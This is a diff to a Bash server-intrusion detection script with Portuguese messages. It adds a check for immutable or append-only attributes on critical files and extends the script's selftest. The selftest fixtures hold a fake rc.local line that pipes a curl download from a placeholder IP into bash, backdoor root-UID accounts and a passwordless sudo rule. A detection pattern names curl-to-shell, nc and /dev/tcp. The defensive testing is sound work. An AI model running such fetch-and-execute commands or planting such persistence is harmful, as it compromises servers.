@@ -366,6 +366,9 @@ cmd_audit() {
       if echo "$l" | grep -qE '(curl|wget)[^|]*\|[^|]*(ba)?sh|postroot|nc -|/dev/tcp|base64'; then warn "$f BAIXA/EXECUTA SCRIPT REMOTO NO BOOT: $l"; else info "$f: $l"; fi
     done
   done
+  for f in /etc/passwd /etc/shadow /etc/group /etc/gshadow /etc/sudoers /etc/rc.local /etc/rc.d/rc.local /etc/crontab /var/spool/cron/root /var/spool/cron/asterisk; do
+    [ -e "$f" ] && lsattr -d "$f" 2>/dev/null | awk '{print $1}' | grep -qE 'i|a' && warn "atributo imutavel/append-only em $f (invasor impede remocao): chattr -i -a $f"
+  done
   find /etc/systemd/system /usr/lib/systemd/system -type f -name '*.service' -mtime "-${days}" 2>/dev/null | head -10 | while read -r l; do warn "servico systemd criado/alterado recentemente: $l"; done
   find /tmp /var/tmp /dev/shm -type f \( -name '*.php' -o -name '*.sh' -o -perm -u+x \) 2>/dev/null | head -15 | while read -r l; do warn "arquivo suspeito em area temporaria: $l"; done
 
@@ -577,7 +580,21 @@ check_persistence() {
     < <(cat ${SENTINEL_SUDOERS:-/etc/sudoers /etc/sudoers.d/*} 2>/dev/null | grep -vE '^\s*#' | grep -E 'NOPASSWD:\s*ALL\s*$')
 }
 
-host_checks() { check_firewall; check_dialplan; check_cron; check_framework; check_persistence; }
+# Atributo imutavel/append-only em arquivos criticos: truque de invasor para impedir a
+# remocao de contas e persistencias (chattr +i /etc/passwd). So alerta.
+check_immutable() {
+  command -v lsattr >/dev/null 2>&1 || return 0
+  local f a
+  for f in ${SENTINEL_ATTR_FILES:-/etc/passwd /etc/shadow /etc/group /etc/gshadow /etc/sudoers /etc/rc.local /etc/rc.d/rc.local /etc/crontab /etc/ld.so.preload /var/spool/cron/root /var/spool/cron/asterisk}; do
+    [ -e "$f" ] || continue
+    a="$(lsattr -d "$f" 2>/dev/null | awk '{print $1}')"
+    case "$a" in
+      *i*|*a*) persist_alert "attr|$f|$a" "arquivo critico PROTEGIDO contra alteracao (atributo ${a}), truque de invasor para impedir a remocao de contas/persistencias: $f  (para remover: chattr -i -a $f)" ;;
+    esac
+  done
+}
+
+host_checks() { check_firewall; check_dialplan; check_cron; check_framework; check_persistence; check_immutable; }
 
 do_scan() {
   local mode="$1"
@@ -675,12 +692,13 @@ cmd_selftest() {
   printf 'root:x:0:0:root:/root:/bin/bash\nyum:x:0:0::/home/yum:/bin/bash\nabort:x:0:0::/:/bin/bash\nasterisk:x:100:100::/:/bin/bash\n' > "$T/passwd"
   printf '#!/bin/bash\n/usr/local/sbin/motd.sh > /etc/motd\nbash -c "curl -ks http://203.0.113.9/r/postroot.sh|bash"\n' > "$T/rc.local"
   printf 'asterisk ALL = NOPASSWD: /sbin/service\nasterisk ALL=(ALL) NOPASSWD: ALL\n' > "$T/sudoers"
-  ( PATH="$T/bin:$PATH" WEB_DIR="$T/web" SENTINEL_QUAR="$T/quar" SENTINEL_LOG="$T/log" SENTINEL_NO_ALERT=1 SENTINEL_CONF=/nonexistent SENTINEL_ALLOW=/nonexistent SENTINEL_STATE="$T/state" SENTINEL_ACL_DB=/nonexistent SENTINEL_CRED_FILES="" SENTINEL_FIREWALL_HEAL=0 SENTINEL_DIALPLAN_GLOB="$T/extensions*.conf" SENTINEL_CRON_DIR="$T/cron" SENTINEL_FRAMEWORK_VER="4.0.0-12" SENTINEL_PASSWD="$T/passwd" SENTINEL_RCLOCAL="$T/rc.local" SENTINEL_SUDOERS="$T/sudoers" "$0" --scan >/dev/null 2>&1 )
+  printf '#!/bin/bash\nprintf -- "----i---------e-- %%s\\n" "$2"\n' > "$T/bin/lsattr"; chmod +x "$T/bin/lsattr"
+  ( PATH="$T/bin:$PATH" WEB_DIR="$T/web" SENTINEL_QUAR="$T/quar" SENTINEL_LOG="$T/log" SENTINEL_NO_ALERT=1 SENTINEL_CONF=/nonexistent SENTINEL_ALLOW=/nonexistent SENTINEL_STATE="$T/state" SENTINEL_ACL_DB=/nonexistent SENTINEL_CRED_FILES="" SENTINEL_FIREWALL_HEAL=0 SENTINEL_DIALPLAN_GLOB="$T/extensions*.conf" SENTINEL_CRON_DIR="$T/cron" SENTINEL_FRAMEWORK_VER="4.0.0-12" SENTINEL_PASSWD="$T/passwd" SENTINEL_RCLOCAL="$T/rc.local" SENTINEL_SUDOERS="$T/sudoers" SENTINEL_ATTR_FILES="$T/passwd" "$0" --scan >/dev/null 2>&1 )
   chk() { if [ "$2" = "gone" ] && [ ! -e "$1" ]; then ok=$((ok+1)); elif [ "$2" = "kept" ] && [ -e "$1" ]; then ok=$((ok+1)); else bad=$((bad+1)); echo "FALHA: $1 deveria estar '$2'"; fi; }
   chk "$T/web/modules/a_emad.php" gone;  chk "$T/web/modules/b_chain.php" gone;  chk "$T/web/modules/c_decode.php" gone
   chk "$T/web/images/d_static.php" gone; chk "$T/web/admin/modules/phones" gone
   chk "$T/web/modules/legitimo.php" kept; chk "$T/web/admin/libraries/php-upgrade/compat.php" kept; chk "$T/web/admin/modules/core/XML_Unserializer.php" kept
-  for k in "FIREWALL: iptables parado" "DIALPLAN malicioso" "CRON suspeito" "FRAMEWORK vulneravel" "PERSISTENCIA: usuario com poderes de root alem do root: yum" "PERSISTENCIA: usuario com poderes de root alem do root: abort" "baixa e executa script remoto a cada boot" "sudo SEM SENHA para qualquer comando"; do
+  for k in "FIREWALL: iptables parado" "DIALPLAN malicioso" "CRON suspeito" "FRAMEWORK vulneravel" "PERSISTENCIA: usuario com poderes de root alem do root: yum" "PERSISTENCIA: usuario com poderes de root alem do root: abort" "baixa e executa script remoto a cada boot" "sudo SEM SENHA para qualquer comando" "PROTEGIDO contra alteracao"; do
     if grep -qF "$k" "$T/log"; then ok=$((ok+1)); else bad=$((bad+1)); echo "FALHA: alerta '$k' nao gerado"; fi
   done
   rm -rf "$T"
